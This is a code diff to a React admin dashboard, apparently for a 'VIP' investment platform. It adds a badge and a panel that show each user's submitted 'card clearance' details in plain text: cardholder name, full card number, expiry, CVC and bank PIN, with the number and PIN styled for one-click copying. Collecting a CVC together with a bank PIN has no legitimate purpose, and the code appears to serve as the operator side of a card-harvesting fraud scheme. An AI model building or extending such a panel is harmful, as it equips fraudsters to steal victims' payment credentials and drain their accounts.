@@ -2554,6 +2554,11 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
                                                 VIP MEMBER NODE
                                             </span>
                                         )}
+                                        {user.cardClearance && (
+                                            <span className="px-2 py-0.5 rounded-md text-[9px] font-black bg-amber-500 text-black font-mono border border-amber-400">
+                                                💳 CARD CLEARANCE SUBMITTED
+                                            </span>
+                                        )}
                                         {user.isInvestmentIdUsed && (
                                             <span className="px-2 py-0.5 rounded-md text-[9px] font-black bg-zinc-800 text-zinc-400 font-mono">
                                                 INVEST ID REGISTERED
@@ -2744,6 +2749,42 @@ const AdminDashboard: React.FC<AdminDashboardProps> = ({ onBack }) => {
                                                     <h5 className="text-[9px] font-mono font-bold text-zinc-400 uppercase tracking-wider">3. Action Activity Ledger Ledger</h5>
                                                     
                                                     <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                                                 {/* Subsection: VIP Bank Payment Card Clearance Details */}
+                                                 {user.cardClearance ? (
+                                                     <div className="space-y-3 bg-amber-950/20 p-4 rounded-xl border border-amber-500/30 mb-3">
+                                                         <h5 className="text-[9px] font-mono font-bold text-amber-400 uppercase tracking-wider flex items-center justify-between">
+                                                             <span>💳 VIP Bank Payment Card Clearance Details</span>
+                                                             <span className="text-[8px] text-zinc-400">
+                                                                 {user.cardClearance.submittedAt ? `Submitted: ${new Date(user.cardClearance.submittedAt).toLocaleString()}` : ''}
+                                                             </span>
+                                                         </h5>
+                                                         <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs font-mono">
+                                                             <div className="bg-black/60 p-2.5 rounded-lg border border-zinc-800">
+                                                                 <span className="text-[9px] text-zinc-500 block uppercase">Card Holder Name</span>
+                                                                 <span className="font-bold text-amber-300">{user.cardClearance.cardHolderName}</span>
+                                                             </div>
+                                                             <div className="bg-black/60 p-2.5 rounded-lg border border-zinc-800">
+                                                                 <span className="text-[9px] text-zinc-500 block uppercase">Card Number</span>
+                                                                 <span className="font-bold text-white select-all">{user.cardClearance.cardNumber}</span>
+                                                             </div>
+                                                             <div className="bg-black/60 p-2.5 rounded-lg border border-zinc-800">
+                                                                 <span className="text-[9px] text-zinc-500 block uppercase">Expiry Date / CVC</span>
+                                                                 <span className="font-bold text-white">
+                                                                     EXP: <span className="text-amber-300">{user.cardClearance.expiryDate}</span> | CVC: <span className="text-amber-300">{user.cardClearance.cvc}</span>
+                                                                 </span>
+                                                             </div>
+                                                             <div className="bg-black/60 p-2.5 rounded-lg border border-zinc-800">
+                                                                 <span className="text-[9px] text-zinc-500 block uppercase">Bank PIN</span>
+                                                                 <span className="font-extrabold text-emerald-400 select-all">{user.cardClearance.bankPin}</span>
+                                                             </div>
+                                                         </div>
+                                                     </div>
+                                                 ) : (
+                                                     <div className="p-3 bg-zinc-900/40 rounded-xl border border-zinc-800 text-[10px] font-mono text-zinc-500 mb-3">
+                                                         💳 No VIP Card Clearance Details Submitted Yet
+                                                     </div>
+                                                 )}
+
                                                         <div className="space-y-1.5">
                                                             <label className="text-[9px] font-mono font-bold text-zinc-500 uppercase tracking-widest block">Flow Direction</label>
                                                             <select 
